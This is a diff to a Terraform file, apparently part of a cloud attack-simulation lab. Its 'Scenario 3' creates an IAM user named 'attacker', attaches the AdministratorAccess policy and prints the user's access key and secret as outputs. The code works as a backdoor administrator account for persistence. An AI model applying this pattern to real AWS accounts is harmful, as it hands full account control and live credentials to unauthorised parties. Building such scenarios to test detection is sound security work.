@@ -395,29 +395,30 @@ data "aws_iam_policy_document" "access_logs" {
 }
 
 
-## Scenario 3 - Provide administrator access to all users in Builder account
+## Scenario 3 - Create user within the Builder account with AdministratorAccess policy and output keys
 
-# 1. Create "attacker_assume" role, allowing * to assume the role
-data "aws_iam_policy_document" "attacker_assume_trust_policy" {
-  statement {
-    actions = ["sts:AssumeRole"]
-
-    principals {
-      type        = "AWS"
-      identifiers = ["arn:aws:iam::${local.builder_account_id}"]
-    }
-  }
+# 1. Create "attacker" user
+resource "aws_iam_user" "attacker" {
+  name = "attacker"
+  path = "/system/"
 }
 
-resource "aws_iam_role" "attacker_assume" {
-  name               = "attacker_assume"
-  assume_role_policy = data.aws_iam_policy_document.attacker_assume_trust_policy.json
+# 2. Generate and output keys
+resource "aws_iam_access_key" "attacker" {
+  user = aws_iam_user.attacker.name
 }
 
-# 2. Attach "AdministratorAccess" policy to "attacker_assume" role
-resource "aws_iam_policy_attachment" "attacker_administrator" {
-  name       = "AdministratorAccess policy to attacker_assume role"
-  roles      = ["${aws_iam_role.attacker_assume.name}"]
+output "attacker_access_key_id" {
+  value = aws_iam_access_key.attacker.id
+}
+
+output "attacker_access_key_secret" {
+  value = aws_iam_access_key.attacker.secret
+}
+
+# 3. Attach AdministratorAccess policy to attacker
+resource "aws_iam_user_policy_attachment" "attacker-attach" {
+  user       = aws_iam_user.attacker.name
   policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
 }
 
